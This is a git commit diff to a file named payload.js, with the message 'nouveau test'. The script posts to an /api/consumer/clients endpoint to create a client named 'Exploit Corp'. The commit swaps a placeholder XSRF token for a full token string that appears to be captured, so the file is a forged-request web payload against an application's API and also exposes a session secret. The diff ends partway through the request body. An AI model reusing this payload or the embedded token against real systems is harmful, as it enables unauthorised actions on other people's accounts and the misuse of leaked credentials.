ac89f8746b4e0de4160fe456131ca0884a101f9b
Larbiter <48391108+Larbiter@users.noreply.github.com>
2025-06-18 09:40:19 +0000

    nouveau test

--- public/payload.js
+++ public/payload.js
@@ -2,7 +2,7 @@ fetch("/api/consumer/clients", {
   method: "POST",
   headers: {
     "Content-Type": "application/json",
-    "X-XSRF-TOKEN": "eyJpdiI6InZTd...REMPLACER...",  // Ton token
+    "X-XSRF-TOKEN": "eyJpdiI6IjRuWUdibnIwMktPRGhMUDZKRGZCWWc9PSIsInZhbHVlIjoiWkRmQUd1b3dhUWdlMXcyZ3VoazRqUWtsNzVUNHhoSEFmYXdxSzJ2M3hmN1pZNHVKSHJmRnpSWXlIVzQ0Z3BWVWsyTmdXU2N2RUdBYnN5V2VJN1IyYmVXVUNoaGgvY3FiWWhkMGRUUnpNQmxOQ05HZ0czS2xmR24zRmZQZ0l1ZTMiLCJtYWMiOiIyYjMzNzBmZmM2MTkzZmEwNjViOGE0YjYyMWM3M2VjMzgyNDFmNjM1YTFlNDhjOTM5M2VlNTkzZTVlMTQ4YzFiIiwidGFnIjoiIn0%3D",  // Ton token
   },
   body: JSON.stringify({
     name: "Exploit Corp",
